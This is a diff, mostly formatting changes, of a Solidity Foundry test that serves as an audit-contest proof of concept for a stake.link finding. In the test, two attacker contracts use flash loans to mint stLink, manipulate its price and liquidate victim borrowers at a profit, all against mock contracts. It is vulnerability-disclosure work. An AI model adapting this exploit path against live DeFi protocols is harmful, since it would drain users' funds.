@@ -14,7 +14,6 @@ import {LendingProtocol} from "../../src/lending/LendingProtocol.sol";
 import {MockERC20} from "../../lib/solady/test/utils/mocks/MockERC20.sol";
 
 contract BaseTest is Test {
-
     MockPriorityPool mockPrio;
     MockStakingPool mockStaking;
     FlashLoanProvider flashLoan;
@@ -32,16 +31,16 @@ contract BaseTest is Test {
     address victim1 = makeAddr("victim1");
     address victim2 = makeAddr("victim2");
     address victim3 = makeAddr("victim3");
-    
-    bytes[]  _data;
+
+    bytes[] _data;
 
     // Stuff used
     uint256 normalize = 1e18;
     uint256 amountToSwap;
-    
+
     /*
      * The amounts for liquidity etc. in this test are arbitrary. This test is only to prove beyond doubt that
-     * my proposed attack vector from finding 1080 in the stake.link contest is valid. As mentioned in my original report
+     * my proposed attack vector from finding 1008 in the stake.link contest is valid. As mentioned in my original report
      * this bug does NOT exist under all circumstances, the return value of StakingPool::canDeposit would need to be big enough
      * to move the price of stLink in the attackers favor. This test aims to provide the attack path, if proposed conditions are met,
      * to validate that the root cause is within the stake.link contracts and that regular user/holders of stLink would be directly at harm.
@@ -72,13 +71,7 @@ contract BaseTest is Test {
         //// Setting up the attackers
         ////// attackerOne is responsible for staking link and using the stLink to manipulate the Price
         attackerOne = new FlashLoanConsumerOne(
-            mockPrio, 
-            poolLinkStlink, 
-            mockStaking, 
-            flashLoan, 
-            address(token), 
-            address(token), 
-            address(token)
+            mockPrio, poolLinkStlink, mockStaking, flashLoan, address(token), address(token), address(token)
         );
         ////// attackerTwo is responsible for using the manipulated Price to Harm stLink users while making a profit
         attackerTwo = new FlashLoanConsumerTwo(flashLoan);
@@ -105,7 +98,7 @@ contract BaseTest is Test {
 
         //// seting up user accounts depositing LST to loan USDC in return
         //// victims are assumed as users which deposited LINK and received stLink in return
-        
+
         token.mint(victim1, 100e18);
         vm.startPrank(victim1);
         token.approve(address(mockPrio), type(uint256).max);
@@ -114,16 +107,16 @@ contract BaseTest is Test {
         lending.deposit(lst.balanceOf(victim1));
         lending.takeLoan();
         vm.stopPrank();
-        
+
         token.mint(victim2, 1000e18);
-        vm.startPrank(victim2); 
+        vm.startPrank(victim2);
         token.approve(address(mockPrio), type(uint256).max);
         mockPrio.deposit(victim2, 1000e18, false, _data);
         lst.approve(address(lending), type(uint256).max);
         lending.deposit(lst.balanceOf(victim2));
         lending.takeLoan();
         vm.stopPrank();
-        
+
         token.mint(victim3, 10000e18);
         vm.startPrank(victim3);
         token.approve(address(mockPrio), type(uint256).max);
@@ -134,10 +127,9 @@ contract BaseTest is Test {
         vm.stopPrank();
     }
 
-
     function test_exploitLstMint() public {
         vm.warp(1);
-        // Here attacker one takes out flashloan 1, swaps it into Link and 
+        // Here attacker one takes out flashloan 1, swaps it into Link and
         // deposit it into stake.link minting stLink
         vm.startPrank(address(attackerOne));
         usdc.approve(address(poolLinkUSDC), type(uint256).max);
@@ -151,12 +143,12 @@ contract BaseTest is Test {
         poolLinkUSDC.swapExactInput(usdc, 10000000e18, token, 0, uint64(block.timestamp));
         mockPrio.deposit(address(attackerOne), token.balanceOf(address(attackerOne)), false, _data);
         vm.stopPrank();
-        // The attacker here takes the 2nd Flashloan, the amount will here be used to 
+        // The attacker here takes the 2nd Flashloan, the amount will here be used to
         // liquidate users of stLink of lending plattforms. This is as mentioned in my report only on
-        // piece of the profitability, the logic can be extended into opening short positions of 
+        // piece of the profitability, the logic can be extended into opening short positions of
         // stLink, opening liquidity positions on exchanges (which would than of course be withdrawn before flashloan 1 reverts) etc.
         // There are essentially many ways to profit within the DeFi ecosystem from falling token prices.
-        // This test though, primarly aims to prove that proposed scenario is possible, directly harms the users and the root cause 
+        // This test though, primarly aims to prove that proposed scenario is possible, directly harms the users and the root cause
         // is within the deposit chain of the stake.link contracts.
         // Setting a variable to track and logging it to confirm
         uint256 startingBalance = usdc.balanceOf(address(attackerTwo));
@@ -198,5 +190,5 @@ contract BaseTest is Test {
         // Final Check, the thing which matters: Did we make USDC?
         assert(endingBalance > startingBalance);
         console.log("Attackers Ending USDC balance: ", endingBalance / 1e18);
-    }    
+    }
 }
